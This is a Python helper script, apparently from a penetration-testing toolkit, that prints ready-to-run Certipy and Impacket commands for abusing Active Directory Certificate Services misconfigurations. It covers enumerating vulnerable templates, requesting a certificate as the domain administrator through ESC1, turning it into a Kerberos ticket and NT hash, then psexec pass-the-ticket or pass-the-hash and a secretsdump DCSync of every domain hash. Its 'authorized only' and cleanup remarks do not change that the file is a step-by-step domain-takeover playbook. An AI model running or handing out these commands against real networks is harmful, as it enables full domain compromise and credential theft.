#!/usr/bin/env python3
"""ADCS ABUSE (Certipy) — AD Certificate Services misconfigs (ESC1-ESC16) -> a cert -> PKINIT -> TGT/NT
hash -> often Domain Admin. Needs a low-priv domain cred (or a relay, see gen_relay.py adcs=ESC8).
Cert auth SURVIVES password resets. PRINTS commands. Authorized only.

Usage:
  python3 gen_adcs.py find   --user u --pass p --dc 10.0.0.10 --domain corp.local   # enumerate vulnerable templates
  python3 gen_adcs.py esc1   --user u --pass p --ca CORP-CA --template VulnTemplate --domain corp.local
  python3 gen_adcs.py auth   --pfx administrator.pfx --dc 10.0.0.10                  # cert -> TGT/NT hash
"""
import sys
import _network_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg  = sys.argv[1] if len(sys.argv) > 1 else "find"
u    = opt("--user", "<user>"); pw = opt("--pass", "<pass>")
dc   = opt("--dc", "<DC-IP>");  dom = opt("--domain", P.DOMAIN or "corp.local")
ca   = opt("--ca", "<CA-name>"); tmpl = opt("--template", "<template>")
who  = f"{dom}/{u}:'{pw}'"

if arg == "find":
    print(f"# needs: ANY low-priv domain credential ({u}:{pw}) + reachable DC/CA. (no cred? get one via gen_poison/gen_spray first.)")
    print(f"# 1) enumerate the PKI + find VULNERABLE templates/config (ESC1-16):")
    print(f"certipy find -u {u}@{dom} -p '{pw}' -dc-ip {dc} -vulnerable -stdout")
    print(f"# -> ok: output lists templates flagged [!] Vulnerable with the ESC id — that's your target below.")
    print(f"#    look for: ESC1 (enrollee-supplies-subject + client-auth), ESC2/3 (any-purpose/agent),")
    print(f"#    ESC4 (write on the template), ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2), ESC8 (web enroll -> relay),")
    print(f"#    ESC9/10 (no-security-extension), ESC11 (IF_ENFORCEENCRYPTICERTREQUEST), ESC13, ESC15 (v1 schema).")
    print(f"# -> pick the ESC + template, then the matching command below (ESC1 shown; certipy handles each).")

elif arg == "esc1":
    print(f"# ESC1 — template lets the enrollee supply the SubjectAltName + allows client auth.")
    print(f"# request a cert AS a Domain Admin (upn = the target you want to become):")
    print(f"certipy req -u {u}@{dom} -p '{pw}' -dc-ip {dc} -ca {ca} -template {tmpl} -upn administrator@{dom}")
    print(f"#   -> administrator.pfx.  Then authenticate with it (gen_adcs.py auth --pfx administrator.pfx).")
    print(f"# ESC6/ESC9/ESC10 are similar (certipy req with -upn/-sid); ESC4: certipy template to make a template vuln first.")

elif arg == "esc8":
    print(f"# ESC8 — the CA exposes WEB ENROLLMENT (http/s certsrv). This is a RELAY target, not a direct req:")
    print(f"#   see  gen_relay.py adcs  — coerce a DC, relay its NTLM to /certsrv, get the DC$ cert -> DA.")

elif arg == "auth":
    pfx = opt("--pfx", "administrator.pfx")
    print(f"# authenticate with the cert -> Kerberos TGT + the account's NT hash:")
    print(f"certipy auth -pfx {pfx} -dc-ip {dc}")
    print(f"#   -> prints the NT hash + writes a .ccache TGT.  Then:")
    print(f"#   export KRB5CCNAME=administrator.ccache ; psexec.py -k -no-pass {dom}/administrator@{dc}   (PtT)")
    print(f"#   or Pass-the-Hash:  psexec.py -hashes :<nt> {dom}/administrator@{dc}")
    print(f"#   DCSync everything:  secretsdump.py -just-dc {dom}/administrator@{dc} -hashes :<nt>")
else:
    print("use: find | esc1 | esc8 | auth"); sys.exit(1)

print(f"\n# NOTE: a requested cert is valid for a LONG time and survives password resets — record it as an")
print(f"#   artifact (report --cleanup) and revoke it post-engagement. ESC4/template edits must be reverted.")
